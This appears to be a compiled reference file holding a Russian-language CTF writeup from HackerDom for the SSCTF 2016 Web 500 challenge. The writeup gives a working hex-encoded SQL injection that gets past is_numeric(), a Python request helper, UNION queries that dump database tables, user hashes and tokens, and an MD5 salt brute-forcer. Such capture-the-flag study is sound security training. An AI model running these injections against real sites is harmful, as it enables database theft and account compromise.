<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-hackerdom
description: CTF writeups and security challenges by HackerDom.
---

# Writeups by HackerDom

Source repository: `/repos/HackerDom`

## Repository Index

- writeups/README.md
- writeups/2016/README.md
- writeups/2016/SSCTF 2016 Quals/Web 500/Web 500.md

## Writeup Content


### File: writeups/2016/README.md

# 2016

1. SSCTF 2016 Quals — China CTF from [Seclover](http://lab.seclover.com/), <https://ctftime.org/event/282>
   * [Web 500 (AFSRC-Market)](SSCTF%202016%20Quals/Web%20500/Web%20500.md), автор [Алексей Коврижных](https://github.com/a1exdandy)



### File: writeups/README.md

# Writeups
Hackerdom CTF writeups

## [2016](2016/README.md)

1. SSCTF 2016 Quals — China CTF from [Seclover](http://lab.seclover.com/), <https://ctftime.org/event/282>
   * [Web 500 (AFSRC-Market)](2016/SSCTF%202016%20Quals/Web%20500/Web%20500.md), автор [Алексей Коврижных](https://github.com/a1exdandy)



### File: writeups/2016/SSCTF 2016 Quals/Web 500/Web 500.md

SSCTF 2016 Quals 
=====
AFSRC-Market (Web, 500)
-----


> Задание:
> 
> 
> Welcome To AFSRC-Market
> 
> Let's Shopping~
> 
> 战题链接 <http://edb24e7c.seclover.com/>


![Главная страница][main_page]

Просмотрев главную страницу становится понятно, что форма поиска не функционирует.
При попытке добавить какой-либо товар в корзину появляется просьба войти на сайт, и
происходит редирект на страницу входа.
При нажатии на сами товары проиcходит переход по ссылке `https://security.alipay.com/`.

![Please login~~~~~~][alert_msg]

![Страница входа][login_page]

На странице входа требуется ввести логин, пароль и капчу. Попытки использовать различные
служебные символы не приводят к неожиданному поведению сайта.
Перейдем к странице регистрации. Попробуем зарегистрировать нового пользователя.

![Успешная регистрация][reg_success]

![Успешный вход][login_success]

Видим сообщение об успешной регистрации, после которого нас перенаправляют на страницу входа. Пытаемся зайти и... Успех!

![Главная страница после входа][main_page_after_login]

В шапке сайта появились ссылки на профиль пользователя и кнопка выхода. Форма поиска, как и раньше, не функционирует.
Заметим, что после авторизации, в cookie было добавлено единственное значение PHPSESSID - идентификатор сессии в PHP.

![Куки][cookies]

Теперь при попытке добавить товар в корзину осуществляется переход по ссылке вида
`http://edb24e7c.seclover.com/add_cart.php?id=XXX` где вместо `XXX` - какой-нибудь номер.
После этого окрывается домашняя страница, и больше ничего не происходит.
При попытке вставить в параметр `id` различные числа всегда появляется сообщение об успешном добавлении;
при вводе символов, не являющихся цифрами, выдается сообщение об ошибке. Также допустим ввод следующего типа: `id=0x123456`.
Это говорит о том, что параметр `id`, скорее всего, проверяетя перед вставкой в запрос с помощью PHP функции `is_numeric()`.

![Страница пользователя][user_page]

Теперь рассмотрим страницу пользователя. В шапке сайта появляется ссылка `AddMoney` на
`http://edb24e7c.seclover.com/addmoney.php`, при переходе по которой выводится сообщение `Please Input The Money`.
Также имеются 3 переключаемые вкладки: `Description`, `Additional Information`, `MyInfo`.
Первые две вкладки не так интересны, т.к. скорее всего являются статическими, а третья содержит форму
для добавления денег. Попробуем отправить форму и получим сообщение об ошибке.

![Форма пополнения счета][my_info]

![Сообщение об ошибке при отправке формы][add_money_error]

Также внимание привлекает
строка `The Last cost: 0`. Попробуем выяснить, откуда взялось значение `0`.
После небольшого исследования становится ясно, что при каждом запросе `/add_cart.php?id=XXX`, при указании верного числа в `id`, `The Last cost` принимает случайное ненулевое значение. Если `id=0x123456` или другому случайному hex, то значение обнуляется.
Итак, значение `The Last cost` каким-то образом зависит от параметра `id`, изменяемом при добавлении товара. Как уже было сказано, скорее всего значение параметра `id` проверяется с помощью функции `is_numeric()`, которая пропускает hex. Попробуем совершить простую "is_numeric bypass" sql-инъекцию через параметр `id`. Для генерации hex-значений воспользуемся `python3`
```python
>>> hex(int.from_bytes(b'1 AND 1=2 ; -- ', 'big'))
'0x3120414e4420313d32203b202d2d20'
```

![Простая sql-инъекция, обходящая is_numeric][try_simple_inj]

![Результат инъекции][simple_inj_result]

Как видно на скрине, значение стало пустым. Для удобства исследования напишем функцию на Python, которая будет
отправлять нужный запрос и получать новое значение со страницы пользователя.

```python
import requests
import re


URL = 'http://edb24e7c.seclover.com/'
regexp = r'<p>The Last cost: (.*?)</p>'
cookies = {'PHPSESSID': 'ckf3pes604sgtr3vpp3lrc62t4'}


def sql(query):
    hexed = hex(int.from_bytes(query.encode(), 'big'))
    requests.get(URL + '/add_cart.php', params={'id': hexed}, cookies=cookies)
    result = requests.get(URL + '/userinfo.php', cookies=cookies).text
    match_obj = re.search(regexp, result)
    if match_obj:
        return match_obj.group(1)

```

После чего приступим к запросам:

```python
>>> sql('1')
'1103'
>>> sql('1 AND 1=1 GROUP BY 1 ; -- ')
'4024'
>>> sql('1 AND 1=1 GROUP BY 2 ; -- ')
'7939'
>>> sql('1 AND 1=1 GROUP BY 3 ; -- ')
'501'
>>> sql('1 AND 1=1 GROUP BY 4 ; -- ')
'2059'
>>> sql('1 AND 1=1 GROUP BY 5 ; -- ')
'0'
>>> sql('1 AND 1=2 UNION SELECT "first", "second", "third", "fourth" ; -- ')
'third'
```

Итак, мы выяснили, что результатом запроса должна быть строка из четырех элементов, причем мы можем смотреть значение третьего элемента. Продолжим извлечение данных из базы.

```python
>>> sql('1 AND 1=2 UNION SELECT 1, 2, database(), 4 ; -- ')
'web05'
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema="web05"), 4 ; -- ')
'flag,user,user_goods'
```

Видим очень интересное название таблицы - `flag`.

```python
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema="web05" AND table_name="flag"), 4 ; -- ')
'id,flag'
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT COUNT(*) FROM flag), 4 ; -- ')
'1'
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT CONCAT(id, ",", flag) FROM flag), 4 ; -- ')
'1,Tips:/2112jb1njIUIJ__tr_R/tips.txt'
```

Попробуем перейти на `/2112jb1njIUIJ__tr_R/tips.txt`.

> tips:
>
> 1、Congratulations for you !You finished 80%,Come on continue!
>
> 2、token=md5(md5(username)+salt) salt max lenght is 5(hexs)
>
> 3、Add the Money Get the Flag

Во второй подсказке говорится о каком-то токене. А чтобы получить флаг, нужно пополнить счет.
Вернемся к форме пополнение денег и посмотрим исходный код формы.

![Исходный код формы][form_source]

Видим, что в форме есть скрытый параметр `salt`. Осталось его подобрать, но для этого необходим `token`.
Вернемся к базе данных и посмотрим, какие данные хранятся в таблице пользователей.

```python
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema="web05" AND table_name="user"), 4 ; -- ')
'id,username,password,token,scores'
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT CONCAT(id,",",username,",",password,",",token,",",scores) FROM user WHERE username="a1ex01234"), 4 ; -- ')
'1086,a1ex01234,a1412c40bab245f4a17b675263cae6f7,d77716fc244dcdd08b5de5a82375e437,0'
```

Итак, мы получили `token`, который генерируется для каждого пользователя. Подберем подходящую соль, используя вторую подсказку. Для этого опять воспользуемся `python3`, где для перебора будет полезна библиотека `itertools`.

```python
import itertools
from hashlib import md5


username = b'a1ex01234'
hex_char = '0123456789abcdef'
token = 'd77716fc244dcdd08b5de5a82375e437'

for salt in itertools.product(hex_char, repeat=5):
    salt = ''.join(salt)
    hash_val = md5(md5(username).hexdigest().encode() + salt.encode()).hexdigest()
    if hash_val == token:
        print('Salt =', salt)
        break
```

Запустим скрипт и увидим результат: `Salt = 8b76d`. Добавим его в форму пополнения счета.

![Измененная форма][salted_form]

![Флаг][flag_is]

Получаем флаг!

[main_page]: images/main_page.png "Главная страница"
[alert_msg]: images/alert_msg.png "Предупреждение"
[login_page]: images/login_page.png "Страница входа"
[reg_success]: images/reg_succ.png "Успешная регистрация"
[try_login]: images/login.png "Попытка войти"
[login_success]: images/login_succ.png "Вход прошел успешно"
[main_page_after_login]: images/main_page_after_login.png "Главная страница после входа"
[cookies]: images/cookies.png "Cookies"
[my_info]: images/my_info.png "Форма пополнения счета"
[user_page]: images/user_page.png "Страница пользователя"
[add_money_error]: images/add_money_error.png "Ошибка при пополнении счета"
[try_simple_inj]: images/inj.png "Попытка вставить простую sql-инъекцию"
[simple_inj_result]: images/inj_res.png "Результат sql-иъекции"
[form_source]: images/form_source.png "Исходный код формы пополнения счета"
[salted_form]: images/salted_form.png "Измененная форма"
[flag_is]: images/flag_is.png "Флаг"

